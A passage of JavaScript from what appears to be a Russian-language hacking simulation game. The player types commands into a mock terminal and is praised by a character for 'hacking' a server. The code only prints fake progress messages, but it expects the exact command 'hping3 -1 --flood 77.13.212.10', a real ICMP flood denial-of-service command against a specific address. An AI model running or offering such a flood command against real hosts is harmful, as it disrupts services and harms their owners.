                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Вначале программу нужно запустить командой hping3<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`initialization hping3<br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('hping3 is activated<br>')
        input.placeholder = 'hping3 commands:';
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            new_mesage_alert()
            add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim() === 'hping3 -1 --flood 77.13.212.10') {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда введена неправильно, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Command correct.<br> Connections...<br> <br><div class="loader"><span id="loader_count"></span>%<div id="loader_line"></div></div>`)
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('Attack starting...<br>')
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        for (let i = 1; i < 50; i++) {
            add_new_message(`request ${i} sent...<br>`)
        }
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message(`Attack completed. Server is not responding. Timed out request.<br>`)
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            // new_mesage_alert()
            // add_new_message('Введите команду hping3 для начала атаки: <br>')

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('sendmessage_to:') && input.value.trim().includes('admin@bstloot.cm')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';

                    go.removeEventListener('click', enterCommand); // Удаляем обработчик события
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Команда или адрес почты введены введены неправильно, попробуйте снова<br>')
                }

            });
        });
    })
    .then(() => {
        return new Promise((resolve, reject) => {

            go.addEventListener('click', function enterCommand(e) {

                if (input.value.trim().includes('print_message --m')) {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    input.placeholder = 'Commands:';

                    go.removeEventListener('click', enterCommand);
                    new_mesage_alert()
                    add_new_message('Message sent <br>')
                    resolve(input.value.trim());
                } else {
                    add_new_message(`<span class="user">${input.value}</span><br>`)
                    input.value = '';
                    new_error_alert()
                    add_new_message('Ожидается команда print_message --m your text<br>')
                }

            });
        });
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Ты сегодня огонь. Прошел собеседвание у Адидаса, помог его брату с впр, восстановил справедлиовтсь в школе и наказал вора директора, хакнул сервак с левыми платежами. Герой!<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="mems">{[Mems]}</span>Теперь иди, отдохни. Я найду для нас новую работенку) Как всегда мануал с тем, что сегодня делали, с меня. С тебя - его внимательно прочитать. Клянусь процом, тебе все это еще пригодится!<br>')
        return new Promise(resolve => setTimeout(resolve, 3000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="moderator">{[Moderator]}</span> Mems не в сети<br>')
        return new Promise(resolve => setTimeout(resolve, 1000));
    })
    .then(() => {

        new_mesage_alert()
        add_new_message('<span class="moderator">{[Moderator]}</span> Adidas не в сети<br>')
        return new Promise(resolve => setTimeout(resolve, 1000));
    })


